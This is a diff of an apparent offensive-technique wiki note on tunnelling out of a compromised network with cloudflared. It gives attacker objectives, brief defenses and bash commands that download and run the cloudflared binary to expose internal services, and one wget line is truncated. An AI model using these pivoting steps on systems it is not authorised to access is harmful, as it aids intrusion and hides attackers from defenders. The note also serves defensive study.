@@ -34,6 +34,8 @@ From a technical perspective, this technique involves installing and configuring
 
 The business value of this technique is that it allows an attacker to access sensitive resources that are not directly accessible from the internet, such as internal web applications or databases. By using Cloudflare's network, the attacker can also hide their true location and make it more difficult for defenders to track their movements.
 
+ 
+
 ## Requirements
 
 1. Access to a compromised system on the target network
@@ -41,6 +43,8 @@ The business value of this technique is that it allows an attacker to access sen
 1. Installation and configuration of cloudflared on the compromised system
 
 1. Access to a web server on the compromised system
+
+ 
 
 ## Defense
 
@@ -50,6 +54,8 @@ The business value of this technique is that it allows an attacker to access sen
 
 1. Implement strong authentication and access controls to limit the impact of a compromised system
 
+ 
+
 ## Objectives
 
 1. Gain access to sensitive resources that are not directly accessible from the internet
@@ -58,6 +64,8 @@ The business value of this technique is that it allows an attacker to access sen
 
 1. Hide the attacker's true location
 
+ 
+
 # Instructions
 
 1. To expose an internal service to the internet, follow these steps:
@@ -65,10 +73,18 @@ The business value of this technique is that it allows an attacker to access sen
 2. Extract the downloaded file using the command 'tar xvzf cloudflared-stable-linux-amd64.tgz'.
 3. Run the command './cloudflared tunnel --url <protocol>://<host>:<port>', replacing <protocol>, <host>, and <port> with the appropriate values for your service. This will create a secure tunnel between your internal service and the internet.
 
+ 
+
+
+
 **Code**: [[# Get the binary
 wget https://bin.equinox.io/c/Vdr]]
 
+
+
 > The 'cloudflared tunnel' command is used to create a secure tunnel between an internal service and the internet. The '--url' flag is used to specify the protocol, host, and port of the internal service. This allows the service to be accessed from the internet using the specified URL. The 'wget' command is used to download the Cloudflared binary, and the 'tar' command is used to extract the downloaded file.
+
+
 
 **Command** ([[Download Cloudflared binary]]):
 
@@ -77,11 +93,17 @@ wget https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.tgz
 tar xvzf cloudflared-stable-linux-amd64.tgz
 ```
 
+
+
+
+
 **Command** ([[Expose internal service to the internet]]):
 
 ```bash
 ./cloudflared tunnel --url <protocol>://<host>:<port>
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -102,3 +124,5 @@ tar xvzf cloudflared-stable-linux-amd64.tgz
 
 - [[cloudflared]]
 - [[Network Pivoting Techniques]]
+
+
